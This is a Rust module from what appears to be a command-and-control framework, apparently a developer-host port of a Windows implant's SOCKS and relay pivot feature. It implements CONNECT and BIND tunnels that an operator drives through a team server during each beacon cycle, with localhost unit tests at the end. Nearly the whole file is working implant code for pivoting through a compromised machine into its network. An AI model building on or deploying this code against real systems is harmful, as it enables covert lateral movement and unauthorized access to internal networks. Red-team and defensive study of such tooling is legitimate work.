//! SOCKS / relay pivot channels for the dev agent.
//!
//! Std-port of `implant-win/src/pivot.rs` so the operator can exercise the
//! FULL relay chain on the dev host (no Windows needed):
//!
//! ```text
//!   operator tool ──SOCKS──▶ team server ──task ChannelData──▶ dev agent
//!                                                                 │
//!                                                          TCP socket
//!                                                                 │
//!   operator ◀──results Channel── team server ◀─pump── dev agent ◀┘
//! ```
//!
//! Semantics mirror the PIC implant exactly (status codes, teardown rules):
//! - `Connect`/`Socks op 1`: TCP connect (5 s deadline), kept in the channel
//!   table, acked with `Channel { status: 0 }`.
//! - `Socks op 2` (BIND): TCP listener; the first accepted peer becomes the
//!   relay on the same chan id (SOCKS5 BIND semantics).
//! - `ChannelData`: write to the socket; a would-block/error tears the channel
//!   down with `status: 3` (data integrity over keeping a congested channel —
//!   same call as the implant).
//! - `pump_channels` (once per beacon cycle): non-blocking recv → `status: 1`
//!   data; peer EOF → `status: 2` + teardown; other errors → `status: 3` +
//!   teardown. BIND listeners are accept-driven.
//! - `ChannelClose`: teardown, idempotent.

use std::cell::RefCell;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::time::Duration;

use nyx_protocol::Response;

/// Upper bound on open channels (mirrors the implant's MAX_CHANNELS).
const MAX_CHANNELS: usize = 64;
/// Connect deadline (implant: 5 s non-blocking select).
const CONNECT_TIMEOUT: Duration = Duration::from_secs(5);

enum Chan {
    Relay(TcpStream),
    Listener(TcpListener),
}

// Per-agent channel table. THREAD-LOCAL on purpose: each dev-agent instance
// owns its sockets, and in the e2e test binary several agents run as threads
// of one process — a process-global table would let one agent's pump drain
// another agent's relay. (In production each agent is its own process, so
// thread-local == process-local there too.)
thread_local! {
    static CHANNELS: RefCell<HashMap<u32, Chan>> = RefCell::new(HashMap::new());
}

fn with_channels<R>(f: impl FnOnce(&mut HashMap<u32, Chan>) -> R) -> R {
    CHANNELS.with(|c| f(&mut c.borrow_mut()))
}

/// `Command::Connect { proto, host, port, chan }`. proto 0 = TCP (the only
/// supported one). On success the socket stays in the table and the channel
/// acks with `status: 0`; bytes flow via [`channel_data`] /
/// [`pump_channels`].
pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
    if proto != 0 {
        return Response::Err(format!("connect: unsupported proto {proto} (only TCP=0)"));
    }
    if chan as usize >= MAX_CHANNELS {
        return Response::Err("connect: channel id out of range".to_string());
    }

    // Resolve + connect with a deadline (mirror: non-blocking connect with a
    // 5 s select). A channel with this id already open is replaced.
    let Ok(mut addrs) = format!("{host}:{port}").to_socket_addrs() else {
        return Response::Err("connect: host resolution failed".to_string());
    };
    let Some(addr) = addrs.next() else {
        return Response::Err("connect: no addresses for host".to_string());
    };
    let stream = match TcpStream::connect_timeout(&addr, CONNECT_TIMEOUT) {
        Ok(s) => s,
        Err(e) => return Response::Err(format!("connect: {e}")),
    };
    if stream.set_nonblocking(true).is_err() {
        return Response::Err("connect: set_nonblocking failed".to_string());
    }

    with_channels(|map| map.insert(chan, Chan::Relay(stream)));
    Response::Channel {
        chan,
        status: 0,
        data: Vec::new(),
    }
}

/// SOCKS BIND: listen on `addr:port`; the first accepted peer becomes the
/// relay on the same chan id (SOCKS5 BIND semantics).
fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
    if chan as usize >= MAX_CHANNELS {
        return Response::Err("socks bind: channel id out of range".to_string());
    }
    let listener = match TcpListener::bind((addr, port)) {
        Ok(l) => l,
        Err(e) => return Response::Err(format!("socks bind: {e}")),
    };
    if listener.set_nonblocking(true).is_err() {
        return Response::Err("socks bind: set_nonblocking failed".to_string());
    }
    with_channels(|map| map.insert(chan, Chan::Listener(listener)));
    Response::Channel {
        chan,
        status: 0,
        data: Vec::new(),
    }
}

/// `Command::Socks { chan, op, addr, port }`: op 1 = CONNECT, op 2 = BIND
/// (mirrors the implant's SOCKS5 mapping).
pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
    match op {
        1 => do_connect(0, addr, port, chan),
        2 => do_bind(addr, port, chan),
        other => Response::Err(format!("socks: unsupported op {other}")),
    }
}

/// `Command::ChannelData { chan, data }`: write bytes to the relay socket.
/// A would-block or error tears the channel down with `status: 3` (data
/// integrity over keeping a congested channel — same call as the implant).
pub fn channel_data(chan: u32, data: &[u8]) -> Response {
    with_channels(|map| match map.get_mut(&chan) {
        Some(Chan::Relay(s)) => match s.write_all(data) {
            Ok(()) => Response::Ok,
            Err(_) => {
                map.remove(&chan);
                Response::Channel {
                    chan,
                    status: 3,
                    data: Vec::new(),
                }
            }
        },
        _ => Response::Err("channel_data: unknown channel".to_string()),
    })
}

/// `Command::ChannelClose { chan }`: teardown. Idempotent.
pub fn channel_close(chan: u32) -> Response {
    with_channels(|map| {
        map.remove(&chan);
    });
    Response::Ok
}

/// Drain every open channel into `Response::Channel` frames for this beacon
/// cycle (called once per cycle, before the POST — mirrors the PIC beacon).
///
/// Per relay: non-blocking read → `status: 1` with the bytes; `0` (peer EOF)
/// → `status: 2` + teardown; other errors → `status: 3` + teardown.
/// Per listener: non-blocking accept → the peer replaces the listener on the
/// same chan (acked with `status: 0`).
pub fn pump_channels() -> Vec<Response> {
    let mut out: Vec<Response> = Vec::new();
    with_channels(|map| {
        let mut closed: Vec<u32> = Vec::new();

        for (chan, entry) in map.iter_mut() {
            match entry {
                Chan::Listener(l) => match l.accept() {
                    Ok((stream, _)) => {
                        if stream.set_nonblocking(true).is_err() {
                            closed.push(*chan);
                            out.push(Response::Channel {
                                chan: *chan,
                                status: 3,
                                data: Vec::new(),
                            });
                            continue;
                        }
                        // SOCKS5 BIND: the first accepted connection IS the relay.
                        *entry = Chan::Relay(stream);
                        out.push(Response::Channel {
                            chan: *chan,
                            status: 0,
                            data: Vec::new(),
                        });
                    }
                    Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                    Err(_) => {
                        closed.push(*chan);
                        out.push(Response::Channel {
                            chan: *chan,
                            status: 3,
                            data: Vec::new(),
                        });
                    }
                },
                Chan::Relay(s) => {
                    let mut buf = [0u8; 4096];
                    match s.read(&mut buf) {
                        Ok(0) => {
                            // Peer closed the connection cleanly.
                            closed.push(*chan);
                            out.push(Response::Channel {
                                chan: *chan,
                                status: 2,
                                data: Vec::new(),
                            });
                        }
                        Ok(n) => {
                            out.push(Response::Channel {
                                chan: *chan,
                                status: 1,
                                data: buf[..n].to_vec(),
                            });
                        }
                        Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                        Err(_) => {
                            closed.push(*chan);
                            out.push(Response::Channel {
                                chan: *chan,
                                status: 3,
                                data: Vec::new(),
                            });
                        }
                    }
                }
            }
        }

        for c in closed {
            map.remove(&c);
        }
    });
    out
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    // NOTE: the channel table is thread-local, so each test gets a fresh
    // table — no cross-test interference, no lock needed.

    #[test]
    fn connect_rejects_non_tcp_proto() {
        assert!(matches!(do_connect(9, "127.0.0.1", 1, 1), Response::Err(_)));
    }

    #[test]
    fn connect_to_closed_port_fails_with_err() {
        // Port 1 is never listening.
        assert!(matches!(do_connect(0, "127.0.0.1", 1, 1), Response::Err(_)));
    }

    #[test]
    fn channel_data_on_unknown_channel_is_err() {
        assert!(matches!(
            channel_data(42, b"x"),
            Response::Err(ref e) if e.contains("unknown channel")
        ));
    }

    #[test]
    fn channel_close_is_idempotent() {
        assert_eq!(channel_close(1), Response::Ok);
        assert_eq!(channel_close(1), Response::Ok);
    }

    #[test]
    fn bind_accept_pumps_relay_data() {
        // Bind an ephemeral port via do_bind.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener); // free the port so do_bind can take it
        let r = do_bind("127.0.0.1", port, 7);
        assert!(matches!(r, Response::Channel { status: 0, .. }));

        // A client connects + sends bytes.
        let mut client = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
        client.write_all(b"hello-relay").unwrap();

        // Pump until the accept lands (the listener is non-blocking; the
        // accept queue entry may lag the client's connect return by a moment).
        let mut pump1 = Vec::new();
        for _ in 0..50 {
            pump1 = pump_channels();
            if pump1
                .iter()
                .any(|r| matches!(r, Response::Channel { status: 0, .. }))
            {
                break;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        assert_eq!(pump1.len(), 1);
        assert!(matches!(
            &pump1[0],
            Response::Channel {
                chan: 7,
                status: 0,
                ..
            }
        ));

        // Second pump: the relay socket has the client's bytes (status 1).
        let pump2 = pump_channels();
        assert!(matches!(
            &pump2[0],
            Response::Channel { chan: 7, status: 1, data } if data == b"hello-relay"
        ));

        // channel_data writes back to the peer.
        assert_eq!(channel_data(7, b"reply"), Response::Ok);
        let mut buf = [0u8; 5];
        client.read_exact(&mut buf).unwrap();
        assert_eq!(&buf, b"reply");

        // Client close → pump reports status 2 (closed). The FIN arrives
        // asynchronously, so poll briefly.
        drop(client);
        let mut pump3 = Vec::new();
        for _ in 0..50 {
            pump3 = pump_channels();
            if pump3
                .iter()
                .any(|r| matches!(r, Response::Channel { status: 2, .. }))
            {
                break;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        assert!(matches!(
            &pump3[0],
            Response::Channel {
                chan: 7,
                status: 2,
                ..
            }
        ));
        // Channel is gone.
        assert!(matches!(channel_data(7, b"x"), Response::Err(_)));
    }
}
